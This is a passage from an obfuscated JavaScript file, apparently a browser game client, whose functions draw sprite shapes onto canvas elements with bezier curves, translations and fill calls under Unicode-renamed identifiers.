			Δ.bezierCurveTo(133.5 * ᐃ, 107.25 * ᐃ, ᐃ * 130.5, 97.25 * ᐃ, 130.5 * ᐃ, 87.25 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 129.5, ᐃ * 56.25, ᐃ * 130, 70.75 * ᐃ, ᐃ * 129.5, ᐃ * 54.25);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆ], Ⲇᐃ[1], ᐃ * 7);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⲆΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(17.5 * ᐃ, ᐃ * 27);
			Δ.bezierCurveTo(ᐃ * 48.5, ΔΔᐃⲆ * ᐃ, ᐃ * 93.5, ᐃ * ΔⲆᐃᐃᐃ, 118.5 * ᐃ, 26 * ᐃ);
			Δ.bezierCurveTo(132.5 * ᐃ, ᐃ * 35, ᐃ * 133.5, 52 * ᐃ, ᐃ * 132.5, 68 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 125.5, ᐃ * 87, 116.5 * ᐃ, 84 * ᐃ, ᐃ * 96.5, 75 * ᐃ);
			Δ.bezierCurveTo(60.5 * ᐃ, 66 * ᐃ, 52.5 * ᐃ, 74 * ᐃ, ᐃ * 37.5, ᐃ * 78);
			Δ.bezierCurveTo(2.5 * ᐃ, ᐃ * 86, 3.5 * ᐃ, ᐃ * 78, ᐃ * 1.5, ᐃ * 61);
			Δ.bezierCurveTo(ᐃ * 1.5, ᐃ * 37, 9.5 * ᐃ, ᐃ * 32, ᐃ * 15.5, ᐃ * 28);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔΔⵠ], Ⲇᐃ[3], ᐃ * ⵠᐃⵠᐃΔΔΔ);
			return Ⲇⵠ
		}

		function ΔⵠᐃⲆᐃΔᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 90 * ᐃ;
			Ⲇⵠ.height = ᐃ * 101;
			Δ.translate(0 * ᐃ, ᐃⲆⵠΔ * ᐃ);
			ΔΔⵠⵠ === ⵠᐃ && (Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1, ⵠᐃᐃ(Δ, 44 * ᐃ, 55 * ᐃ, ᐃ * 41), ΔⲆ(Δ, Ⲇᐃ[0]));
			Δ.globalAlpha = 1;
			ⵠᐃᐃ(Δ, 44 * ᐃ, ᐃ * 45, 41 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[Ⲇᐃᐃⵠ], ᐃ * ΔΔⵠⵠΔ);
			ⵠᐃᐃ(Δ, ᐃ * 44, ᐃ * 45, ᐃ * 31);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠᐃ]);
			Δ.save();
			Δ.translate(ᐃ * 45, ᐃ * 45);
			Ⲇᐃᐃ(Δ, -ΔΔΔΔΔ * ᐃ, -25.5 * ᐃ, ᐃ * ᐃⲆᐃⲆⲆᐃᐃ, 51 * ᐃ, ᐃ * 30);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[4], ᐃ * ⲆΔΔⵠ);
			Δ.save();
			Δ.translate(ᐃ * 45, 45 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -26, -ΔᐃΔᐃⲆΔΔ * ᐃ, 52 * ᐃ, ᐃ * ΔΔⲆⵠⵠᐃᐃ, 30 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[4], ᐃ * ⵠⵠⵠΔ);
			ⵠᐃᐃ(Δ, ᐃ * 45, 29 * ᐃ, ᐃ * ᐃⲆⲆᐃᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆᐃ]);
			ⵠᐃᐃ(Δ, 45 * ᐃ, ᐃ * 61, 7 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[5]);
			ⵠᐃᐃ(Δ, 28 * ᐃ, ᐃ * 45, ⲆⵠⲆᐃⵠⲆΔ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[5]);
			ⵠᐃᐃ(Δ, 62 * ᐃ, 45 * ᐃ, ᐃ * 7);
			ΔⲆ(Δ, Ⲇᐃ[5]);
			return Ⲇⵠ
		}

		function ⵠⵠⵠΔΔⵠⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 175 * ᐃ;
			Ⲇⵠ.height = ᐃ * 169;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ⲆⲆⲆⵠⲆ * ᐃ, ᐃ * 112);
			Δ.bezierCurveTo(14 * ᐃ, 146 * ᐃ, 27 * ᐃ, 152 * ᐃ, ᐃ * 37, ᐃ * 149);
			Δ.bezierCurveTo(78 * ᐃ, ᐃ * 155, ᐃ * 128, 150 * ᐃ, 146 * ᐃ, ᐃ * 150);
			Δ.bezierCurveTo(ᐃ * 158, ᐃ * 144, ᐃ * 158, ᐃ * 121, ᐃ * 153, 114 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃᐃⲆᐃ], Ⲇᐃ[9], ᐃ * ⵠⲆⵠⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(127 * ᐃ, ᐃ * 111);
			Δ.bezierCurveTo(133 * ᐃ, 136 * ᐃ, ᐃ * 115, ᐃ * 149, 88 * ᐃ, 150 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 119.5, 151 * ᐃ, ᐃ * 119.5, ᐃ * 151, 151 * ᐃ, ᐃ * 152);
			Δ.bezierCurveTo(ᐃ * 159, 136 * ᐃ, ᐃ * 155, ᐃ * 126, ᐃ * 154, ᐃ * 113);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃΔᐃᐃΔⲆⵠ]);
			Δ.globalAlpha = .5;
			Δ.translate(0, ᐃⲆΔⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 15, 117 * ᐃ);
			Δ.bezierCurveTo(34 * ᐃ, ᐃ * 109, ᐃ * 61, ᐃ * 106, 94 * ᐃ, ᐃ * 109);
			Δ.bezierCurveTo(ᐃ * 126, ᐃ * 110, ᐃ * 142, 113 * ᐃ, 154 * ᐃ, 119 * ᐃ);
			Δ.bezierCurveTo(154 * ᐃ, ᐃ * 123, 154 * ᐃ, 123 * ᐃ, ᐃ * 154, 127 * ᐃ);
			Δ.bezierCurveTo(127 * ᐃ, 118 * ᐃ, ᐃ * 15, ᐃ * 122, ᐃ * 18, ᐃ * 129);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ]);
			Δ.globalAlpha = ΔΔᐃⵠ;
			Δ.translate(0, -3 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(ᐃ * 14, 127 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 13, 117 * ᐃ, ᐃ * 12, ᐃ * 109, ᐃ * ᐃᐃⵠΔⲆⵠᐃ, 103 * ᐃ);
			Δ.bezierCurveTo(ΔⵠᐃᐃⵠⲆⲆ * ᐃ, 95 * ᐃ, ᐃ * 21, 92 * ᐃ, ᐃ * 60, ᐃ * 93);
			Δ.bezierCurveTo(91 * ᐃ, ᐃ * 93, 118 * ᐃ, 93 * ᐃ, ᐃ * 143, 96 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 151, 96 * ᐃ, ᐃ * 155, ᐃ * 99, ᐃ * 156, ᐃ * 112);
			Δ.bezierCurveTo(ᐃ * 157, 124 * ᐃ, ᐃ * 157, 127 * ᐃ, 156 * ᐃ, ᐃ * 128);
			Δ.bezierCurveTo(ᐃ * 138, ᐃ * 112, ᐃᐃⲆⲆⲆⲆⲆ * ᐃ, 118 * ᐃ, ᐃ * 84, 118 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 28, 118 * ᐃ, ᐃ * 20, ᐃ * 120, 16 * ᐃ, ᐃ * 127);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ⲆΔΔᐃ], 5 * ᐃ);
			Δ.save();
			Δ.translate(27.5 * ᐃ, 138.5 * ᐃ);
			Ⲇᐃᐃ(Δ, -13.5 * ᐃ, ᐃ * -14.5, ᐃ * 27, 29 * ᐃ, ᐃ * 4);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠ], Ⲇᐃ[ΔⵠᐃⲆ], ⵠⵠΔⵠ * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 143.5, 137 * ᐃ);
			Ⲇᐃᐃ(Δ, ᐃ * -13.5, -14 * ᐃ, 27 * ᐃ, ᐃ * 28, ᐃ * 4);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ᐃⲆⵠᐃ], ᐃ * ⵠⵠΔⵠ);
			return Ⲇⵠ
		}

		function ⵠΔⵠΔΔⵠᐃ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 372;
			Ⲇⵠ.height = 375 * ᐃ;
			Δ.globalAlpha = .5;
			Δ.translate(ᐃ * ᐃΔᐃΔᐃΔᐃ, ᐃ * ΔⲆᐃᐃⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(313.0000305175781 * ᐃ, 76.58523559570312 * ᐃ);
			Δ.bezierCurveTo(308.0000305175781 * ᐃ, 130.58523559570312 * ᐃ, ᐃ * 279.0000305175781, 158.58523559570312 * ᐃ, 254.00003051757812 * ᐃ, ᐃ * 175.58523559570312);
			Δ.bezierCurveTo(ᐃ * 287.0000305175781, 182.58523559570312 * ᐃ, 274.0000305175781 * ᐃ, ᐃ * 181.08523559570312, ᐃ * 294.0000305175781, ᐃ * 186.58523559570312);
			Δ.bezierCurveTo(ᐃ * 293.5000305175781, 196.08523559570312 * ᐃ, ᐃ * 293.5000305175781, ᐃ * 196.08523559570312, 293.0000305175781 * ᐃ, ᐃ * 205.58523559570312);
			Δ.bezierCurveTo(ᐃ * 304.0000305175781, ᐃ * 201.08523559570312, 304.0000305175781 * ᐃ, ᐃ * 201.08523559570312, ᐃ * 315.0000305175781, 196.58523559570312 * ᐃ);
			Δ.bezierCurveTo(350.0000305175781 * ᐃ, ᐃ * 219.58523559570312, 343.0000305175781 * ᐃ, ᐃ * 221.58523559570312, ᐃ * 351.0000305175781, ᐃ * 230.58523559570312);
			Δ.bezierCurveTo(ᐃ * 296.0000305175781, ᐃ * 260.5852355957031, 264.0000305175781 * ᐃ, 256.5852355957031 * ᐃ, 220.00003051757812 * ᐃ, 236.58523559570312 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 233.00003051757812, ᐃ * 266.5852355957031, ᐃ * 232.00003051757812, ᐃ * 279.5852355957031, ᐃ * 231.00003051757812, 295.5852355957031 * ᐃ);
			Δ.bezierCurveTo(222.00003051757812 * ᐃ, 297.5852355957031 * ᐃ, 222.00003051757812 * ᐃ, 297.5852355957031 * ᐃ, 213.00003051757812 * ᐃ, 299.5852355957031 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 219.50003051757812, 308.0852355957031 * ᐃ, 219.50003051757812 * ᐃ, ᐃ * 308.0852355957031, ᐃ * 226.00003051757812, ᐃ * 316.5852355957031);
			Δ.bezierCurveTo(223.00003051757812 * ᐃ, ᐃ * 344.5852355957031, ᐃ * 216.00003051757812, 350.5852355957031 * ᐃ, ᐃ * 209.00003051757812, 363.5852355957031 * ᐃ);
			Δ.bezierCurveTo(154.00003051757812 * ᐃ, ᐃ * 318.5852355957031, 156.00003051757812 * ᐃ, ᐃ * 268.5852355957031, ᐃ * 160.00003051757812, ᐃ * 238.58523559570312);
			Δ.bezierCurveTo(ᐃ * 135.00003051757812, 268.5852355957031 * ᐃ, 125.00003051757812 * ᐃ, 267.5852355957031 * ᐃ, ᐃ * 112.00003051757812, ᐃ * 272.5852355957031);
			Δ.bezierCurveTo(104.50003051757812 * ᐃ, 266.5852355957031 * ᐃ, ᐃ * 104.50003051757812, 266.5852355957031 * ᐃ, ᐃ * 97.00003051757812, ᐃ * 260.5852355957031);
			Δ.bezierCurveTo(ᐃ * 93.00003051757812, 271.0852355957031 * ᐃ, 93.00003051757812 * ᐃ, ᐃ * 271.0852355957031, 89.00003051757812 * ᐃ, ᐃ * 281.5852355957031);
			Δ.bezierCurveTo(66.00003051757812 * ᐃ, ᐃ * 288.5852355957031, ᐃ * 59.000030517578125, ᐃ * 288.5852355957031, ᐃ * 39.000030517578125, 285.5852355957031 * ᐃ);
			Δ.bezierCurveTo(56.000030517578125 * ᐃ, 216.58523559570312 * ᐃ, ᐃ * 91.00003051757812, 204.58523559570312 * ᐃ, 129.00003051757812 * ᐃ, ᐃ * 189.58523559570312);
			Δ.bezierCurveTo(ᐃ * 90.00003051757812, ᐃ * 176.58523559570312, ᐃ * 89.00003051757812, ᐃ * 173.58523559570312, 79.00003051757812 * ᐃ, ᐃ * 166.58523559570312);
			Δ.bezierCurveTo(82.00003051757812 * ᐃ, 155.08523559570312 * ᐃ, ᐃ * 82.00003051757812, 155.08523559570312 * ᐃ, 85.00003051757812 * ᐃ, ᐃ * 143.58523559570312);
			Δ.bezierCurveTo(75.50003051757812 * ᐃ, ᐃ * 147.58523559570312, 75.50003051757812 * ᐃ, 147.58523559570312 * ᐃ, 66.00003051757812 * ᐃ, 151.58523559570312 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 44.000030517578125, ᐃ * 133.58523559570312, 41.000030517578125 * ᐃ, ᐃ * 124.58523559570312, ᐃ * 34.000030517578125, ᐃ * 102.58523559570312);
			Δ.bezierCurveTo(100.00003051757812 * ᐃ, ᐃ * 81.58523559570312, ᐃ * 134.00003051757812, 118.58523559570312 * ᐃ, ᐃ * 150.00003051757812, 128.58523559570312 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 144.00003051757812, ᐃ * 102.58523559570312, 147.00003051757812 * ᐃ, 90.58523559570312 * ᐃ, 150.00003051757812 * ᐃ, 80.58523559570312 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 159.50003051757812, ᐃ * 79.08523559570312, 159.50003051757812 * ᐃ, ᐃ * 79.08523559570312, ᐃ * 169.00003051757812, ᐃ * 77.58523559570312);
			Δ.bezierCurveTo(ᐃ * 163.00003051757812, 72.58523559570312 * ᐃ, 163.00003051757812 * ᐃ, 72.58523559570312 * ᐃ, 157.00003051757812 * ᐃ, ᐃ * 67.58523559570312);
			Δ.bezierCurveTo(ᐃ * 162.00003051757812, ᐃ * 42.585235595703125, 169.00003051757812 * ᐃ, 29.585235595703125 * ᐃ, 182.00003051757812 * ᐃ, ᐃ * 14.585235595703125);
			Δ.bezierCurveTo(219.00003051757812 * ᐃ, 48.585235595703125 * ᐃ, ᐃ * 222.00003051757812, ᐃ * 92.58523559570312, 218.00003051757812 * ᐃ, ᐃ * 112.58523559570312);
			Δ.bezierCurveTo(239.00003051757812 * ᐃ, ᐃ * 95.58523559570312, 242.00003051757812 * ᐃ, 97.58523559570312 * ᐃ, ᐃ * 249.00003051757812, 94.58523559570312 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 255.00003051757812, 103.08523559570312 * ᐃ, ᐃ * 255.00003051757812, 103.08523559570312 * ᐃ, 261.0000305175781 * ᐃ, ᐃ * 111.58523559570312);
			Δ.bezierCurveTo(ᐃ * 261.5000305175781, ᐃ * 99.58523559570312, 261.5000305175781 * ᐃ, 99.58523559570312 * ᐃ, 262.0000305175781 * ᐃ, ᐃ * 87.58523559570312);
			Δ.bezierCurveTo(282.0000305175781 * ᐃ, ᐃ * 77.58523559570312, 301.0000305175781 * ᐃ, ᐃ * 74.58523559570312, 314.0000305175781 * ᐃ, 76.58523559570312 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = Ⲇᐃⵠ;
			Δ.translate(ᐃ * -15, ᐃ * -ΔⲆΔⲆⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(313.0000305175781 * ᐃ, 76.58523559570312 * ᐃ);
			Δ.bezierCurveTo(308.0000305175781 * ᐃ, 130.58523559570312 * ᐃ, ᐃ * 279.0000305175781, 158.58523559570312 * ᐃ, 254.00003051757812 * ᐃ, 175.58523559570312 * ᐃ);
			Δ.bezierCurveTo(287.0000305175781 * ᐃ, 182.58523559570312 * ᐃ, 274.0000305175781 * ᐃ, ᐃ * 181.08523559570312, ᐃ * 294.0000305175781, 186.58523559570312 * ᐃ);
			Δ.bezierCurveTo(293.5000305175781 * ᐃ, 196.08523559570312 * ᐃ, 293.5000305175781 * ᐃ, ᐃ * 196.08523559570312, ᐃ * 293.0000305175781, 205.58523559570312 * ᐃ);
			Δ.bezierCurveTo(304.0000305175781 * ᐃ, ᐃ * 201.08523559570312, ᐃ * 304.0000305175781, 201.08523559570312 * ᐃ, 315.0000305175781 * ᐃ, ᐃ * 196.58523559570312);
			Δ.bezierCurveTo(ᐃ * 350.0000305175781, ᐃ * 219.58523559570312, ᐃ * 343.0000305175781, 221.58523559570312 * ᐃ, 351.0000305175781 * ᐃ, 230.58523559570312 * ᐃ);
			Δ.bezierCurveTo(296.0000305175781 * ᐃ, 260.5852355957031 * ᐃ, ᐃ * 264.0000305175781, ᐃ * 256.5852355957031, ᐃ * 220.00003051757812, 236.58523559570312 * ᐃ);
			Δ.bezierCurveTo(233.00003051757812 * ᐃ, ᐃ * 266.5852355957031, 232.00003051757812 * ᐃ, ᐃ * 279.5852355957031, ᐃ * 231.00003051757812, ᐃ * 295.5852355957031);
			Δ.bezierCurveTo(ᐃ * 222.00003051757812, 297.5852355957031 * ᐃ, ᐃ * 222.00003051757812, 297.5852355957031 * ᐃ, ᐃ * 213.00003051757812, ᐃ * 299.5852355957031);
			Δ.bezierCurveTo(ᐃ * 219.50003051757812, 308.0852355957031 * ᐃ, 219.50003051757812 * ᐃ, ᐃ * 308.0852355957031, 226.00003051757812 * ᐃ, ᐃ * 316.5852355957031);
			Δ.bezierCurveTo(ᐃ * 223.00003051757812, 344.5852355957031 * ᐃ, 216.00003051757812 * ᐃ, ᐃ * 350.5852355957031, 209.00003051757812 * ᐃ, ᐃ * 363.5852355957031);
			Δ.bezierCurveTo(ᐃ * 154.00003051757812, ᐃ * 318.5852355957031, 156.00003051757812 * ᐃ, ᐃ * 268.5852355957031, ᐃ * 160.00003051757812, 238.58523559570312 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 135.00003051757812, 268.5852355957031 * ᐃ, 125.00003051757812 * ᐃ, ᐃ * 267.5852355957031, ᐃ * 112.00003051757812, ᐃ * 272.5852355957031);
			Δ.bezierCurveTo(104.50003051757812 * ᐃ, 266.5852355957031 * ᐃ, ᐃ * 104.50003051757812, 266.5852355957031 * ᐃ, 97.00003051757812 * ᐃ, 260.5852355957031 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 93.00003051757812, 271.0852355957031 * ᐃ, ᐃ * 93.00003051757812, ᐃ * 271.0852355957031, 89.00003051757812 * ᐃ, ᐃ * 281.5852355957031);
			Δ.bezierCurveTo(ᐃ * 66.00003051757812, 288.5852355957031 * ᐃ, ᐃ * 59.000030517578125, ᐃ * 288.5852355957031, 39.000030517578125 * ᐃ, 285.5852355957031 * ᐃ);
			Δ.bezierCurveTo(56.000030517578125 * ᐃ, 216.58523559570312 * ᐃ, ᐃ * 91.00003051757812, 204.58523559570312 * ᐃ, 129.00003051757812 * ᐃ, ᐃ * 189.58523559570312);
			Δ.bezierCurveTo(ᐃ * 90.00003051757812, 176.58523559570312 * ᐃ, ᐃ * 89.00003051757812, 173.58523559570312 * ᐃ, ᐃ * 79.00003051757812, 166.58523559570312 * ᐃ);
			Δ.bezierCurveTo(82.00003051757812 * ᐃ, ᐃ * 155.08523559570312, ᐃ * 82.00003051757812, ᐃ * 155.08523559570312, ᐃ * 85.00003051757812, 143.58523559570312 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 75.50003051757812, ᐃ * 147.58523559570312, 75.50003051757812 * ᐃ, ᐃ * 147.58523559570312, ᐃ * 66.00003051757812, 151.58523559570312 * ᐃ);
			Δ.bezierCurveTo(44.000030517578125 * ᐃ, ᐃ * 133.58523559570312, ᐃ * 41.000030517578125, ᐃ * 124.58523559570312, 34.000030517578125 * ᐃ, 102.58523559570312 * ᐃ);
			Δ.bezierCurveTo(100.00003051757812 * ᐃ, 81.58523559570312 * ᐃ, 134.00003051757812 * ᐃ, 118.58523559570312 * ᐃ, ᐃ * 150.00003051757812, 128.58523559570312 * ᐃ);
			Δ.bezierCurveTo(144.00003051757812 * ᐃ, ᐃ * 102.58523559570312, 147.00003051757812 * ᐃ, 90.58523559570312 * ᐃ, ᐃ * 150.00003051757812, ᐃ * 80.58523559570312);
			Δ.bezierCurveTo(159.50003051757812 * ᐃ, 79.08523559570312 * ᐃ, ᐃ * 159.50003051757812, 79.08523559570312 * ᐃ, 169.00003051757812 * ᐃ, 77.58523559570312 * ᐃ);
			Δ.bezierCurveTo(163.00003051757812 * ᐃ, ᐃ * 72.58523559570312, 163.00003051757812 * ᐃ, ᐃ * 72.58523559570312, 157.00003051757812 * ᐃ, ᐃ * 67.58523559570312);
			Δ.bezierCurveTo(162.00003051757812 * ᐃ, ᐃ * 42.585235595703125, 169.00003051757812 * ᐃ, 29.585235595703125 * ᐃ, 182.00003051757812 * ᐃ, 14.585235595703125 * ᐃ);
			Δ.bezierCurveTo(219.00003051757812 * ᐃ, 48.585235595703125 * ᐃ, ᐃ * 222.00003051757812, 92.58523559570312 * ᐃ, ᐃ * 218.00003051757812, 112.58523559570312 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 239.00003051757812, ᐃ * 95.58523559570312, 242.00003051757812 * ᐃ, ᐃ * 97.58523559570312, 249.00003051757812 * ᐃ, ᐃ * 94.58523559570312);
			Δ.bezierCurveTo(ᐃ * 255.00003051757812, 103.08523559570312 * ᐃ, 255.00003051757812 * ᐃ, 103.08523559570312 * ᐃ, ᐃ * 261.0000305175781, ᐃ * 111.58523559570312);
			Δ.bezierCurveTo(261.5000305175781 * ᐃ, 99.58523559570312 * ᐃ, 261.5000305175781 * ᐃ, ᐃ * 99.58523559570312, 262.0000305175781 * ᐃ, ᐃ * 87.58523559570312);
			Δ.bezierCurveTo(282.0000305175781 * ᐃ, 77.58523559570312 * ᐃ, ᐃ * 301.0000305175781, ᐃ * 74.58523559570312, 314.0000305175781 * ᐃ, 76.58523559570312 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ⵠΔⲆᐃ], ᐃ * ⵠⵠΔᐃΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(186.00003051757812 * ᐃ, 192.94886779785156 * ᐃ);
			Δ.bezierCurveTo(185.00003051757812 * ᐃ, ᐃ * 66.94886779785156, 184.50003051757812 * ᐃ, 104.94886779785156 * ᐃ, 183.00003051757812 * ᐃ, ᐃ * 16.948867797851562);
			Δ.bezierCurveTo(216.00003051757812 * ᐃ, 47.94886779785156 * ᐃ, ᐃ * 219.00003051757812, ᐃ * 80.94886779785156, 218.00003051757812 * ᐃ, 113.94886779785156 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 209.00003051757812, 165.94886779785156 * ᐃ, ᐃ * 200.00003051757812, ᐃ * 176.94886779785156, 189.00003051757812 * ᐃ, ᐃ * 192.94886779785156);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ΔΔᐃΔ], Ⲇⵠⵠᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(ᐃ * 190.00003051757812, 191.94886779785156 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 207.00003051757812, ᐃ * 348.94886779785156, ᐃ * 205.00003051757812, 323.94886779785156 * ᐃ, ᐃ * 209.00003051757812, ᐃ * 358.94886779785156);
			Δ.bezierCurveTo(171.00003051757812 * ᐃ, 334.94886779785156 * ᐃ, 167.00003051757812 * ᐃ, ᐃ * 302.94886779785156, ᐃ * 161.00003051757812, 268.94886779785156 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 160.00003051757812, ᐃ * 218.94886779785156, 181.00003051757812 * ᐃ, 191.94886779785156 * ᐃ, 189.00003051757812 * ᐃ, ᐃ * 186.94886779785156);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[3], ΔⵠᐃⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 194.00003051757812, 195.94886779785156 * ᐃ);
			Δ.bezierCurveTo(116.00003051757812 * ᐃ, 150.94886779785156 * ᐃ, 116.00003051757812 * ᐃ, 150.94886779785156 * ᐃ, 38.000030517578125 * ᐃ, ᐃ * 105.94886779785156);
			Δ.bezierCurveTo(67.00003051757812 * ᐃ, 90.94886779785156 * ᐃ, ᐃ * 96.00003051757812, ᐃ * 99.94886779785156, 123.00003051757812 * ᐃ, 111.94886779785156 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 183.00003051757812, 152.94886779785156 * ᐃ, 179.00003051757812 * ᐃ, ᐃ * 180.94886779785156, 193.00003051757812 * ᐃ, 194.94886779785156 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[3], Δⵠⵠⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(ᐃ * 189.00003051757812, 190.94886779785156 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 250.00003051757812, 133.94886779785156 * ᐃ, ᐃ * 311.0000305175781, 78.94886779785156 * ᐃ, ᐃ * 311.0000305175781, 76.94886779785156 * ᐃ);
			Δ.bezierCurveTo(306.0000305175781 * ᐃ, ᐃ * 127.94886779785156, 283.0000305175781 * ᐃ, 148.94886779785156 * ᐃ, 261.0000305175781 * ᐃ, 166.94886779785156 * ᐃ);
			Δ.bezierCurveTo(220.00003051757812 * ᐃ, ᐃ * 197.94886779785156, ᐃ * 191.00003051757812, 194.94886779785156 * ᐃ, ᐃ * 189.00003051757812, ᐃ * 195.94886779785156);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ᐃᐃⲆΔⵠ], Δᐃⵠⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(189.00003051757812 * ᐃ, ᐃ * 194.94886779785156);
			Δ.bezierCurveTo(ᐃ * 268.5000305175781, 211.94886779785156 * ᐃ, 268.5000305175781 * ᐃ, ᐃ * 211.94886779785156, ᐃ * 348.0000305175781, ᐃ * 228.94886779785156);
			Δ.bezierCurveTo(ᐃ * 316.0000305175781, 247.94886779785156 * ᐃ, ᐃ * 298.0000305175781, ᐃ * 256.94886779785156, ᐃ * 250.00003051757812, ᐃ * 246.94886779785156);
			Δ.bezierCurveTo(ᐃ * 197.00003051757812, ᐃ * 229.94886779785156, ᐃ * 189.00003051757812, 202.94886779785156 * ᐃ, ᐃ * 188.00003051757812, 199.94886779785156 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[3], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 192.00003051757812, ᐃ * 191.94886779785156);
			Δ.bezierCurveTo(ᐃ * 116.50003051757812, 238.44886779785156 * ᐃ, 116.50003051757812 * ᐃ, 238.44886779785156 * ᐃ, ᐃ * 41.000030517578125, ᐃ * 284.94886779785156);
			Δ.bezierCurveTo(ᐃ * 49.000030517578125, 252.94886779785156 * ᐃ, 56.000030517578125 * ᐃ, ᐃ * 242.94886779785156, ᐃ * 80.00003051757812, ᐃ * 215.94886779785156);
			Δ.bezierCurveTo(ᐃ * 125.00003051757812, ᐃ * 181.94886779785156, 174.00003051757812 * ᐃ, 183.94886779785156 * ᐃ, ᐃ * 192.00003051757812, ᐃ * 191.94886779785156);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ᐃⲆΔⵠ], ᐃ * ⲆΔΔⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 313.0000305175781, ᐃ * 76.58523559570312);
